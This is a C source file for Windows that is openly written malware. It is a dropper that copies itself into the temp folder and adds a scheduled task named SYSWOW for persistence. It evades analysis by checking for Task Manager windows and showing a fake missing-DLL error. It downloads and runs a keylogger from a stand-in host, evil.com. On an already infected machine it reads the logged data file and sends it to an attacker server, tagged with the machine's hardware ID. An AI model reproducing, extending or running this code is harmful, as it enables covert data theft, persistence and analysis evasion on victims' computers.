#include <tchar.h>
#include <stdio.h>
#include <windows.h>
#include <urlmon.h>
#include <wininet.h>
#include <strsafe.h>
#include <shellapi.h>

//filetodl - main malware to drop
//serverip - server where data will be sent
void pigeon(LPCTSTR filetodl, LPCSTR serverip){
	TCHAR tmppath[MAX_PATH];
	WIN32_FIND_DATA filedat1;
	WIN32_FIND_DATA filedat2;
	GetEnvironmentVariable("TEMP", tmppath, MAX_PATH);
	SetCurrentDirectory(tmppath);
	HANDLE verifyinfection1 = FindFirstFileA("ursakta.exe", &filedat1);
	HANDLE verifyinfection2 = FindFirstFileA("db.txt", &filedat2);
	if (verifyinfection1 == INVALID_HANDLE_VALUE || verifyinfection2 == INVALID_HANDLE_VALUE) {
		printf("Machine isn't infected! Grabbing logger...\n");
		strcat_s(tmppath, strlen(tmppath)+strlen("\\ursakta.exe")+1, "\\ursakta.exe");
		HRESULT verifydl = URLDownloadToFile(NULL, filetodl, tmppath, 0, NULL);
		if (verifydl == S_OK) {
			STARTUPINFO si = {0};
			PROCESS_INFORMATION pi = {0};
			printf("Download successful!\n Check tmp\n");
			int cpresult = CreateProcessA(tmppath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi); 
			if (cpresult == 0) {
				printf("Problem with createprocessA\n");
			}
			else {
				printf("Process created! Exiting...\n");
				exit(1);
			}
		}
		else {
			printf("Problem w/download.\n");
		}
	}
	else {
		printf("Victim is already infected. Beginning to send the files to attacker server!\n");
		CHAR dbfilepath[MAX_PATH];
		HW_PROFILE_INFO huuid;
		TCHAR suuid[MAX_PATH];
		TCHAR urlpath[MAX_PATH] = "/?uuid=";
		OFSTRUCT openfilebuff;
		TCHAR dbfiledat[MAX_PATH];
		LARGE_INTEGER pdbfilesz;
		DWORD rbytes;
		PCTSTR datatypes[] = {_T("text/*"), NULL};
		GetCurrentHwProfileA(&huuid);
		strcat_s(suuid, strlen(suuid)+strlen(huuid.szHwProfileGuid)+1, huuid.szHwProfileGuid);
		strcat_s(urlpath, strlen(urlpath)+strlen(suuid)+1, suuid);
		strcat_s(urlpath, strlen(urlpath)+strlen("&data=")+1, "&data=");
		GetEnvironmentVariable("TEMP", dbfilepath, MAX_PATH);
		//this may be redundant since we've already changed the working dir above
		SetCurrentDirectory(dbfilepath);
		HANDLE opendbfile = OpenFile("db.txt", &openfilebuff, OF_READ);
		if (opendbfile == HFILE_ERROR) {
			printf("Openfile error!\n");
		}
		int getszret = GetFileSizeEx(opendbfile, &pdbfilesz);
		if (getszret == 0) {
			printf("Get file size error!\n");
		}
		LONGLONG ldbfilesz = pdbfilesz.QuadPart;
		ReadFile(opendbfile, dbfiledat, ldbfilesz, &rbytes, NULL);
		strcat_s(urlpath, strlen(urlpath)+strlen(dbfiledat)+1, dbfiledat);
		printf("Final URL path: %s\n", urlpath);
		CloseHandle(opendbfile);
		HINTERNET iopen = InternetOpenA("ursakta", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
		HINTERNET iconnect = InternetConnectA(iopen, serverip, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
		HINTERNET orequest = HttpOpenRequestA(iconnect, "GET", urlpath, NULL, NULL, datatypes, INTERNET_FLAG_NO_AUTH, 0);
		if (orequest == NULL) {
			printf("Problem with opening request!\n");
		}
		//can add optional data (2nd to last slot) to send unique identifier to attacker server
		int srequest = HttpSendRequestA(orequest, NULL, 0, NULL, 0);
		if (srequest == 0) {
			printf("Problem with sending request\n");
		}
	}
}

BOOL CALLBACK monster(HWND hwnd, LPARAM opt){
    	TCHAR cwtitle[MAX_PATH];
	const char * xprocesses[] = {"Process", "Windows Task Manager"};
	GetWindowText(hwnd, cwtitle, MAX_PATH);
	for (int i=0; i < sizeof(xprocesses)/sizeof(xprocesses[0]); i++) {
		int jamfora = strncmp(cwtitle, xprocesses[i], strlen(xprocesses[i]));
		if (jamfora == 0) {
			printf("[!] Possibly in analysis environment!\n");
			//to make error more convincing, add an exe name before System Error (EX: Spotify.exe - System Error
			MessageBoxA(NULL, "The program can't start because MSVCP71.dll is missing from your computer. Try reinstalling the program to fix this problem.", "System Error", MB_OK | MB_ICONERROR);
			exit(0);
			return FALSE;
		}
		else {
			continue;
			return TRUE;
		}
	}
}


int main() {
	EnumWindows(monster, NULL);
	printf("Entering main execution!\n");	
	TCHAR ndroppath[MAX_PATH];
	TCHAR odroppath[MAX_PATH];
	GetEnvironmentVariable("TEMP", ndroppath, MAX_PATH);
	strcat_s(ndroppath, strlen(ndroppath)+strlen("\\01.exe")+1, "\\01.exe");
	GetModuleFileNameA(NULL, odroppath, MAX_PATH);	
	int rcp = CopyFile(odroppath, ndroppath, FALSE);
	if (rcp ==0) {
		printf("Copying drop file to new path failed!\n");
	}
	else {
		HINSTANCE result = ShellExecuteA(NULL, "open", "schtasks.exe", "/create /tn SYSWOW /tr %TMP%\\01.exe /sc daily /mo 12 /sd 08/19/2020 /st 12:00", NULL, 0); 
	}
	pigeon("https://evil.com/malware.exe", "127.0.0.1");
}
